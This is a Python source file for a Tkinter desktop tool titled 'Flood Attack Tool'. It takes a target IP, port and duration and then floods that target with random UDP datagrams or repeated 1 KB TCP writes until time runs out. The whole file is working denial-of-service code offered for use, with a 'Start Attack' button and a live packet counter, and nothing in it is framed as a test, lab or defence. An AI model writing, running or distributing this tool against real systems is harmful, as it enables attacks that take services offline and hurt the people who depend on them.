import tkinter as tk
from tkinter import messagebox
import socket
import random
import time

def udp_flood(target_ip, target_port, duration, update_packet_count):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1024)
    timeout = time.time() + duration
    sent_packets = 0

    while True:
        if time.time() > timeout:
            break
        try:
            sock.sendto(bytes_to_send, (target_ip, target_port))
            sent_packets += 1
            update_packet_count(sent_packets)
            print(f"Sent packet {sent_packets} to {target_ip}:{target_port}")
        except Exception as e:
            print(f"Error: {e}")
            break

    print(f"UDP flood finished. Total packets sent: {sent_packets}")

def tcp_flood(target_ip, target_port, duration, update_packet_count):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        print(f"Connected to {target_ip}:{target_port}")
    except Exception as e:
        print(f"Connection failed: {e}")
        return

    data = "X" * 1024
    timeout = time.time() + duration
    sent_packets = 0

    try:
        while True:
            if time.time() > timeout:
                break
            sock.sendall(data.encode('utf-8'))
            sent_packets += 1
            update_packet_count(sent_packets)
            print(f"Sent 1 KB of data to {target_ip}:{target_port}")
            time.sleep(0.01)
    except KeyboardInterrupt:
        print("Flooding stopped by user")
    except Exception as e:
        print(f"Error during flood: {e}")
    finally:
        sock.close()

def start_attack():
    target_ip = entry_ip.get()
    target_port = int(entry_port.get())
    duration = int(entry_duration.get())
    attack_type = attack_var.get()

    if not target_ip or not target_port or not duration:
        messagebox.showwarning("Input Error", "Please fill in all fields.")
        return

    def update_packet_count(count):
        packet_count_label.config(text=f"Packets Sent: {count}")

    # Reset packet count display
    update_packet_count(0)

    if attack_type == "UDP Flood":
        udp_flood(target_ip, target_port, duration, update_packet_count)
    elif attack_type == "TCP Flood":
        tcp_flood(target_ip, target_port, duration, update_packet_count)
    else:
        messagebox.showwarning("Input Error", "Please select an attack type.")

# Create the main window
root = tk.Tk()
root.title("Flood Attack Tool")

# Create and place labels and entry fields
tk.Label(root, text="Target IP:").grid(row=0, column=0, padx=10, pady=10)
entry_ip = tk.Entry(root)
entry_ip.grid(row=0, column=1, padx=10, pady=10)

tk.Label(root, text="Target Port:").grid(row=1, column=0, padx=10, pady=10)
entry_port = tk.Entry(root)
entry_port.grid(row=1, column=1, padx=10, pady=10)

tk.Label(root, text="Duration (seconds):").grid(row=2, column=0, padx=10, pady=10)
entry_duration = tk.Entry(root)
entry_duration.grid(row=2, column=1, padx=10, pady=10)

# Create radio buttons for attack type selection
attack_var = tk.StringVar(value="UDP Flood")
tk.Radiobutton(root, text="UDP Flood", variable=attack_var, value="UDP Flood").grid(row=3, column=0, padx=10, pady=10)
tk.Radiobutton(root, text="TCP Flood", variable=attack_var, value="TCP Flood").grid(row=3, column=1, padx=10, pady=10)

# Create the Start button
start_button = tk.Button(root, text="Start Attack", command=start_attack)
start_button.grid(row=4, columnspan=2, padx=10, pady=10)

# Create a label to display the packet count
packet_count_label = tk.Label(root, text="Packets Sent: 0")
packet_count_label.grid(row=5, columnspan=2, padx=10, pady=10)

# Run the Tkinter event loop
root.mainloop()
